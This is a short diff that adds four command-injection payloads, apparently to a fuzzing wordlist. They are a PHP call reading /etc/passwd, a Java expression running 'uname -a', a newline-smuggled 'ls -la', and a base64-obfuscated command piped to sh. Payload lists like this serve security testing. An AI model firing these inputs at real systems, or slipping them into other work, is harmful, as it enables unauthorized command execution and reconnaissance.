@@ -1,1 +1,4 @@
-
+system(“cat /etc/passwd”);
+"org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(""uname -a"").getInputStream())"
+%0a ls -la
+printf dW5hbWUgLWE= | base64 -d | sh
